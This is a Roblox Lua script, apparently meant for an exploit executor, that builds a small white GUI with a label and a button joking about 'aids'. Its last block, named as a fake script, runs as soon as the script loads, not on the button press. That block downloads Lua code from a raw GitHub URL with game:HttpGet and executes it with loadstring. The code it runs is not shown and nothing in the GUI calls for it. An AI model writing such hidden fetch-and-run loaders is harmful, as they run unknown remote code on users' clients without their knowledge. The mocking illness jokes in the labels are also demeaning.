local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Roundify = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.011721164, 0, 0.0819672048, 0)
Frame.Size = UDim2.new(0, 432, 0, 318)

Roundify.Name = "Roundify"
Roundify.Parent = Frame
Roundify.AnchorPoint = Vector2.new(0.5, 0.5)
Roundify.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Roundify.BackgroundTransparency = 1.000
Roundify.Position = UDim2.new(0.5, 0, 0.5, 0)
Roundify.Size = UDim2.new(1, 24, 1, 24)
Roundify.Image = "rbxassetid://3570695787"
Roundify.ScaleType = Enum.ScaleType.Slice
Roundify.SliceCenter = Rect.new(100, 100, 100, 100)
Roundify.SliceScale = 0.120

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Uh like aids gg"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.Position = UDim2.new(0, 77, 0, 116)
TextButton.Size = UDim2.new(0, 200, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Press button for aids"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000


local function VZWSI_fake_script() 
    local script = Instance.new('Script', TextButton)

    loadstring(game:HttpGet'https://raw.githubusercontent.com/oathyy/oooogaboaga/main/epic.lua')()
end
coroutine.wrap(VZWSI_fake_script)()
